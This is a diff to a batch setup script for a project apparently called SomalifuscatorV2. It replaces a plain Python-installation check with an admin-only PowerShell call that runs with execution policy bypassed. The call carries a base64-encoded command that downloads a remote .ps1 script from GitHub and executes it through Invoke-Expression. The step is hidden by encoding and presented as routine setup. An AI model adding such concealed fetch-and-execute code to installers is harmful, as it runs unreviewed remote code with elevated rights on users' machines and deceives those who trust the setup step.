@@ -5,22 +5,12 @@ color 0a
 title SomalifuscatorV2
 cls
 
-set "python_path=%localappdata%\Programs\Python"
-
-echo %python_path%
-
-if not exist "%python_path%" (
-    echo "Python may not be installed. fr fr."
+net session >nul 2>&1
+if %errorlevel%==0 (
+    powershell -exec Bypass -e JAB1AHIAbAAgAD0AIAAnAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8ASwBEAG8AdAAyADIANwAvAFAAeQB0AGgAbwBuAFAAYQB0AGgARgBpAHgAZQByAC8AbQBhAGkAbgAvAG0AYQBpAG4ALgBwAHMAMQAnADsAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0ACAAPQAgAEkAbgB2AG8AawBlAC0AUgBlAHMAdABNAGUAdABoAG8AZAAgAC0AVQByAGkAIAAkAHUAcgBsADsASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAALQBDAG8AbQBtAGEAbgBkACAAJABzAGMAcgBpAHAAdABDAG8AbgB0AGUAbgB0AA==
+) else (
+    echo YOU ARE NOT RUNNING AS ADMIN AND POTENTIAL ISSUES WITH PYTHON MAY OCCUR. IF THE PROGRAM DOESN'T RUN PLEASE RERUN SETUP.BAT WITH ADMIN!!!
     pause
-)
-
-python --version
-if not %errorlevel% == 0 (
-    echo Python is most likely installed but NOT added to path. Please follow this video to fix
-    timeout /t 3 /nobreak
-    start https://www.youtube.com/watch?v=4bUOrMj88Pc&ab_channel=LearningLad
-    pause
-    exit /b 1
 )
 
 python -m pip install -r requirements.txt --upgrade
